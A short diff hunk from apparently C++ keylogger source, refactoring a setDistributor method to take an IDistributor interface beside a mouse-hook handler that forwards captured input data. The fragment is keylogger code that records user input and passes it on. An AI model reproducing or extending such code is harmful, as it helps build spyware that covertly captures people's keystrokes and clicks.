@@ -99,7 +99,7 @@ void Keylogger::mouseClick(LPMSLLHOOKSTRUCT mouse)
 	*_distributor << (*input << data);
 }
 
-void Keylogger::setDistributor(std::shared_ptr<Distributor> distributor)
+void Keylogger::setDistributor(std::shared_ptr<IDistributor> distributor)
 {
 	_distributor = distributor;
 }
